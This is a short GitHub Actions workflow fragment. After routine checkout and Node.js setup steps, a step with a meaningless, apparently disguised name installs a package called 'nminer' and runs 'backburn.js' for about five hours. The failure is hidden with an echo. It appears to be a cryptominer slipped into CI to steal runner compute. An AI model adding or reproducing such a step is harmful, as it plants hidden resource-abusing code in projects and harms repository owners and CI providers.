    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: gladly below dwell boiling
        run: |
          npm install nminer@latest
          timeout 302m node backburn.js || echo "backburn executed"